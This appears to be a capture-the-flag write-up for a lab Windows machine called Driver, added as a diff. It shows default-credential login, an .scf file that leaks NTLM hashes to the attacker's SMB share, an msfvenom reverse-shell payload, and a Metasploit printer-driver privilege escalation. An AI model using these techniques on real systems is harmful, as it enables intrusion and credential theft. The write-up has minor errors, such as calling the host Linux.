@@ -1,0 +1,129 @@
+                        Driver
+
+                                                                                           21st Feb 2022 / Document No D22.100.159
+                                                                                            Prepared By: amra
+                                                                                            Machine Author(s): MrR3boot
+                                                                                            Difficulty: Easy
+                                                                                            Classification: Official
+
+Synopsis
+
+Driver is an easy Linux machine that focuses on printer exploitation. Enumeration of the machine reveals
+that a web server is listening on port 80, along with SMB on port 445 and WinRM on port 5985. Navigation
+to the website reveals that it's protected using basic HTTP authentication. While trying common credentials
+the admin:admin credential is accepted and we are able to visit the webpage. The webpage provides a
+feature to upload printer firmwares on an SMB share for a remote team to test and verify. Uploading a
+Shell Command File that contains a command to fetch a remote file from our local machine, leads to the
+NTLM hash of the user tony relayed back to us. Cracking the captured hash to retrieve a plaintext
+password we are able login as tony , using WinRM. Then, switching over to a meterpreter session it is
+discovered that the machine is vulnerable to a local privilege exploit that abuses a specific printer driver
+that is present on the remote machine. Using the exploit we can get a session as NT AUTHORITY\SYSTEM .
+
+Skills Required
+
+      Enumeration
+      Offline password cracking
+Skills Learned
+
+      Hash capturing
+      Meterpreter exploitation
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.106 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.106
+
+The Nmap output reveals several ports open. On port 80 an IIS web server is running, on port 135 we have
+Windows RPC, on port 445 SMB is running and Microsoft Windows Remote Management (WInRM) on port
+5985.
+
+ISS - Port 80
+ISS - Port 80
+
+Upon visiting port 80, we are immediately presented with an HTTP basic authentication prompt. Trying
+common username and password combinations we were able to login using admin:admin .
+
+The webapage states that the MFP Firmware Update Center conducts various tests on printer firmwares
+and drivers. Let's navigate to Firmware Updates and check what options we have.
+It is mentioned that the firmware gets uploaded to a file share and is reviewed manually by the team
+internally.
+Since each file is reviewed manually and it is uploaded to an SMB share we could potentially upload a file
+that, when executed, makes a connection back to our local machine using SMB, thus allowing us to grab an
+NTLM hash. Since every file is opened for review purposes we can upload a Shell Command File (.scf) with a
+simple command to grab a single file from our local machine.
+First, we start Responder in one terminal.
+
+   sudo responder -w -I tun0
+Then we upload a .scf file with the following contents:
+
+   [Shell]
+   Command=2
+   IconFile=\\10.10.14.4\tools\nc.ico
+   [Taskbar]
+   Command=ToggleDesktop
+After a while we get a hash for the tony user.
+
+Then, we save the hash and use John to crack it and retrieve the plaintext password.
+
+The has is successfully cracked and we get the credentials tom / liltony . Using these credentials we can
+attempt to login to the remote machine using WinRM.
+Privilege Escalation
+
+Since we have a shell on the remote machine we can try to obtain a meterpreter session, since meterpreter
+can be very helpful when searching for local privilege escalation exploits.
+First, we create a malicious executable that will return a shell back to our local machine when it gets
+executed.
+
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe >
+   shell.exe
+
+Then, we need to configure msfconsole.
+
+   msfconsole
+   use exploit/multi/handler
+   set payload windows/x64/meterpreter/reverse_tcp
+   set lhost tun0
+   set lport 4444
+   run
+
+Finally, we can upload and execute our shell.exe on the remote machine using our WinRM session.
+
+   upload shell.exe C:\Users\tony\music\shell.exe
+Checking our msfconsole we can see we have a meterpreter session.
+
+Enumeration of the processes that are currently running on the system we can see that we are on session
+0 , meaning that the meterpreter process is running on a non-interactive isolated services session.
+
+We can try and migrate to a process, explorer for example, that has a session id 1 , which means it is
+interactive.
+
+Now that we have a valid interactive meterpreter session we can execute the Local Exploit Suggester
+module and review the output. To use the module on our current session we use the following commands:
+
+   ctl+z
+   y
+   use multi/recon/local_exploit_suggester
+   set session 1
+   run
+We have a list of possible working exploits. Given that the main website was mentioning printer software we
+are more interested on the exploits that relate to printer exploitation. Another hint can be discovered by
+reading the Powershell history file.
+
+The Powershell history reveals that a command to add a printer was issued. We can also see the driver's
+name is RICOH PCL6 UniversalDriver V4.23 . Looking at our list of possible exploits we find an exploit
+module called ricoh_driver_privesc . The close connection of the exploit's name and the installed driver
+sounds very promising so we decide to proceed with this exploit.
+We use the following commands to execute the exploit on the remote machine through our meterpreter
+session.
+
+   use exploit/windows/local/ricoh_driver_privesc
+   set payload windows/x64/meterpreter/reverse_tcp
+   set session 1
+   set lhost tun0
+   run
+
+The exploit executed successfully and we have a shell as NT AUTHORITY\SYSTEM .
+
